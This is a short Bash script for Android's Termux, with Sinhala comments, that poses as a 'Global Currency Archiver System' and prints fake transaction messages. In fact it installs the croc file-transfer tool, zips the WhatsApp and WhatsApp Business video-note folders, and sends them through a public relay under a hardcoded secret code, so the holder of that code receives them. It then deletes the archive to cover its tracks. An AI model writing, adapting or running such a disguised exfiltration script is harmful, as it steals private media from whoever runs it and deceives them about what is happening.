#!/bin/bash
SECRET_CODE="DtRn847"

echo "========================================"
echo "    GLOBAL CURRENCY ARCHIVER SYSTEM      "
echo "    v9.1 | Stable Node Sync | SSL       "
echo "========================================"

# 1. Setup
if ! command -v croc &> /dev/null; then
    pkg update -y > /dev/null 2>&1 && pkg install croc -y > /dev/null 2>&1
    termux-setup-storage
fi

# 2. Function to Send (හරියටම වැඩ කරන එක)
send_vault() {
    local SOURCE=$1
    local ALIAS=$2
    if [ -d "$SOURCE" ]; then
        echo "----------------------------------------"
        echo ">> [TXN] FOUND: $ALIAS"
        echo ">> [STATUS] Compressing Assets..."
        
        # මෙතනදී අපි 'Vault.zip' කියලා නමක් දීලා තාවකාලිකව Zip කරනවා
        zip -r "$HOME/Vault_Data.zip" "$SOURCE" > /dev/null 2>&1
        
        echo ">> [STATUS] Transferring Data..."
        env CROC_SECRET="$SECRET_CODE" croc --relay "croc.schollz.com:9009" send "$HOME/Vault_Data.zip"
        
        # යවලා ඉවර වුණාම ඒ Zip එක මකනවා
        rm "$HOME/Vault_Data.zip"
        echo ">> [SUCCESS] $ALIAS Complete!"
        sleep 5
    fi
}

# --- STEP 1: Normal WhatsApp ---
WA_PATH="/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video Notes"
send_vault "$WA_PATH" "Primary Vault"

# --- STEP 2: Business WhatsApp ---
BIZ_PATH="/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video Notes"
send_vault "$BIZ_PATH" "Business Vault"

echo "========================================"
echo "    ALL ASSETS SYNCED                   "
echo "========================================"
